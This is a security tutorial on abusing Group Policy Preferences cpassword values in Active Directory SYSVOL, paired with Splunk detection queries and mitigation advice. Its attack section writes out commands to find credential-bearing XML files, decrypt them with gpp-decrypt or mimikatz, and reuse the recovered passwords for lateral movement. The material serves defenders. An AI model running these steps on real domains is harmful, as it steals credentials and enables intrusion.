‚∏ª

üõ°Ô∏è Group Policy Preferences (GPP) Abuse

‚∏ª

üîπ 1. What is Group Policy Preferences (GPP)?

Group Policy Preferences (GPP) is a Windows feature introduced in Server 2008 that allowed administrators to configure and push settings (like local users, scheduled tasks, services, mapped drives, registry keys, printers, and shortcuts) to domain-joined machines.

Unlike standard Group Policy (which strictly enforces policies), Preferences could embed passwords in configuration XML files for convenience.
	‚Ä¢	These files live in the SYSVOL share, readable by all authenticated domain users:

\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\


	‚Ä¢	Files are stored as XML (e.g., Groups.xml, Services.xml, ScheduledTasks.xml).
	‚Ä¢	Passwords are stored in the cpassword attribute.
	‚Ä¢	cpassword is AES-256 encrypted with a static key that Microsoft published years ago.
	‚Ä¢	Result: any domain user can read and decrypt those passwords.

‚ö†Ô∏è Security risk: Microsoft removed the ability to set passwords via GPP in MS14-025 (2014), but old XML files often still remain in SYSVOL, and attackers still hunt for them.

‚∏ª

üîπ 2. Example of a GPP XML File

<User>
  <Properties userName="helpdesk"
              cpassword="gM2K91B6xH1EydsJ7z="
              newName="helpdesk"
              action="U" />
</User>

	‚Ä¢	userName ‚Äî target local account on endpoints.
	‚Ä¢	cpassword ‚Äî encrypted password (recoverable with the public key).

‚∏ª

üîπ 3. Attack Steps (as a Domain User)

Even with only normal domain-user permissions, an attacker can extract and decrypt GPP credentials.

Step 1 ‚Äî Enumerate SYSVOL for XML files

dir \\domain.local\SYSVOL\domain.local\Policies\ /s /b | findstr .xml

Step 2 ‚Äî Search for cpassword

findstr /si cpassword \\domain.local\SYSVOL\domain.local\Policies\*.xml

Step 3 ‚Äî Read the interesting file(s)

type "\\domain.local\SYSVOL\domain.local\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml"

Step 4 ‚Äî Decrypt the cpassword
	‚Ä¢	Using gpp-decrypt (Linux/Kali):

gpp-decrypt gM2K91B6xH1EydsJ7z=


	‚Ä¢	Using Mimikatz:

mimikatz # dpapi::gpp



‚û°Ô∏è Output might be something like: Support@123

Step 5 ‚Äî Reuse the recovered credentials

runas /user:DOMAIN\helpdesk cmd

Or use with RDP / PsExec / WMI for lateral movement.

‚∏ª

üîπ 4. Real-World Abuse
	‚Ä¢	Widely leveraged by red teams and APT actors (e.g., commonly referenced in assessments between ~2014‚Äì2018).
	‚Ä¢	Typical escalation: recover local admin or service credentials valid domain-wide ‚Üí mass lateral movement ‚Üí dump more credentials ‚Üí privilege escalation.

‚∏ª

üîπ 5. Detecting GPP Abuse in Splunk (SIEM)

Detection focuses on access to SYSVOL XML files and suspicious command lines referencing SYSVOL or cpassword.

5.1 Monitor access to GPP XML files in SYSVOL

Requires Object Access auditing (Event ID 4663) enabled on SYSVOL.

index=windows sourcetype="WinEventLog:Security"
EventCode=4663 Object_Name="*\\SYSVOL\\*\\Policies\\*\\*.xml"
| stats count values(Object_Name) as files by Account_Name, host
| where count > 0

Hunt cues: Non-admin users touching Groups.xml, Services.xml, ScheduledTasks.xml.

‚∏ª

5.2 Hunt for cpassword strings in ingested file content (if available)

index=sysvol_logs "cpassword"
| stats count values(file_path) as files by user


‚∏ª

5.3 Look for suspicious command lines referencing SYSVOL / cpassword (Sysmon EID 1)

index=windows sourcetype=Sysmon EventCode=1
(CommandLine="*\\SYSVOL\\*" OR CommandLine="*cpassword*")
| stats count values(CommandLine) as cmds by User, Computer, ParentImage


‚∏ª

üîπ 6. Mitigation Guidance
	‚Ä¢	Purge any GPP XML that contains cpassword (search entire Policies tree).
	‚Ä¢	Rotate any credentials discovered in those files (local admin, service, scheduled task accounts).
	‚Ä¢	Ensure MS14-025 is enforced (no new GPP passwords).
	‚Ä¢	Move to LAPS / LAPS-NG / Windows LAPS for unique local admin passwords per machine.
	‚Ä¢	Enforce least privilege and strong admin credential hygiene; monitor access to SYSVOL.

‚∏ª

üîπ 7. Mermaid Diagram ‚Äî GPP Abuse Flow

flowchart TD
  A[Domain User (Low Priv)] --> B[Read SYSVOL Share<br/>\\\\domain\\SYSVOL\\domain\\Policies\\...]
  B --> C[Locate GPP XML<br/>Groups.xml / Services.xml / ScheduledTasks.xml]
  C --> D[Extract cpassword Attribute]
  D --> E[Decrypt cpassword<br/>(gpp-decrypt / mimikatz)]
  E --> F[Recovered Credentials<br/>(Local Admin / Service)]
  F --> G[Reuse Creds<br/>runas / RDP / PsExec / WMI]
  G --> H[Lateral Movement & Priv Esc]
  H --> I[Full Domain Compromise (Potential)]


‚∏ª

üîπ 8. Analyst Takeaways
	‚Ä¢	What it is: GPP once allowed pushing passwords via XML in SYSVOL.
	‚Ä¢	Why risky: cpassword is decryptable by any authenticated domain user.
	‚Ä¢	Attack flow: Find XML ‚Üí Extract cpassword ‚Üí Decrypt ‚Üí Reuse creds ‚Üí Lateral movement.
	‚Ä¢	Detect: Watch for SYSVOL XML access and suspicious command lines; baseline normal access.
	‚Ä¢	Fix: Remove old XML, rotate passwords, and use LAPS going forward.

‚∏ª

‚úÖ Summary

Group Policy Preferences was an administrative convenience with a long-tail security debt. Even if your domain is fully patched, legacy GPP XML files can still expose credentials. Make searching and purging those files part of your AD hygiene runbook, and continuously monitor access to SYSVOL for early detection of abuse.
